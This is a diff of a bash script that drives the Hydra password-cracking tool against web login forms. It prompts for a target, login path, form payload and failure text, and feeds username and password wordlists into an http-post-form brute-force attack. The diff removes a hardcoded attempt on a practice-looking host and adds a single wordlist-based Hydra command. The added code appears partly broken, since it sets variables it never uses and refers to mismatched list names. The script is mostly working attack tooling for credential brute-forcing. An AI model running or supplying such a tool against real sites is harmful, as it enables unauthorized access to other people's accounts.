@@ -14,6 +14,8 @@
 # | Date              : August 24, 2023
 # ------------------------------------------------------------------------------
 
+address=$1
+
 # Define color variables
 GREEN=$(tput setaf 2)
 RED=$(tput setaf 1)
@@ -30,24 +32,6 @@ password_list_1="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/http_defau
 password_list_2="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/unix_passwords.txt"
 password_list_3="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/most_used_passwords.txt"
 password_list_4="$HOME/CYBER_TOOLS/Wordlists/wordlists-main/passwords/xato_net_passwords.txt"
-
-# Ask the user if they know the username
-read -e -p "${YELLOW}Do you know the username? (y/n): ${NC}" -i "n" know_username
-
-if [[ $know_username == "y" ]]; then
-    read -e -p "${YELLOW}Enter the username: ${NC}" -i "" username
-else
-    username=""
-fi
-
-# Ask the user if they know the password
-read -e -p "${YELLOW}Do you know the password? (y/n): ${NC}" -i "n" know_password
-
-if [[ $know_password == "y" ]]; then
-    read -e -p "${YELLOW}Enter the password: ${NC}" -i "" password
-else
-    password=""
-fi
 
 # Ask the user for the level of attack
 read -e -p "${YELLOW}Choose the level of attack (1/2/3/4): ${NC}" -i "1" attack_level
@@ -81,28 +65,35 @@ case $attack_level in
         ;;
 esac
 
+# Ask the user if they know the username
+read -e -p "${YELLOW}Do you know the username? (y/n): ${NC}" -i "n" know_username
+
+if [[ $know_username == "y" ]]; then
+    read -e -p "${YELLOW}Enter the username: ${NC}" -i "" username
+    username_section="-l $username"
+else
+    username_section="-L $user_name_list"
+fi
+
+# Ask the user if they know the password
+read -e -p "${YELLOW}Do you know the password? (y/n): ${NC}" -i "n" know_password
+
+if [[ $know_password == "y" ]]; then
+    read -e -p "${YELLOW}Enter the password: ${NC}" -i "" password
+    password_section="-p $password"
+else
+    password_section="-P $password_list"
+fi
+
 # Ask the user for the path
-read -e -p "${YELLOW}What is the path of the login page, for example '/login' or '/db/index.php': ${NC}" -i "/login" login_dir
+read -e -p "${YELLOW}What is the path of the login page, for example '/login' or '/db/index.php': ${NC}" -i "/" login_dir
 
 # Ask the payload
-read -e -p "${YELLOW}What is the payload, for example 'user=^USER&pass=^PASS^': ${NC}" -i "user=^USER^&pass=^PASS^" payload
+read -e -p "${YELLOW}What is the payload, for example 'user=^USER&pass=^PASS^': ${NC}" -i "user=^USER^&pass=^PASS^&next=13eaff016d52034a43e1b5b6eead7c3e" payload
 
 # Ask the unsuccessful_text
 read -e -p "${YELLOW}What text is displayed on an unsuccessful attempt, for example 'incorrect' or 'unsuccessful': ${NC}" -i "incorrect" unsuccessful_text
 
 # Hydra attack based on user input
 
-if [[ -n $username ]] && [[ -n $password ]]; then
-    hydra -l $username -p $password $address https-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
-elif [[ -n $username ]]; then
-    hydra -l $username -P $password_list $address https-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
-else
-    # hydra -L $user_name_list -P $password_list -e n $address https-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
-    hydra -l $username -p password123 vulnerable.happycakefactory.com http-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
-fi
-
-#hydra -L $user_name_list -P $password_list -e n -m $login_dir $address http-post-form "$login_dir:$payload:$unsuccessful_text" -V -I -f
-
-
-
-
+hydra -L $user_name_list_1 -P $password_list_1 -e n $address http-post-form "$login_dir:$payload:$unsuccessful_text" $verbose -I -f
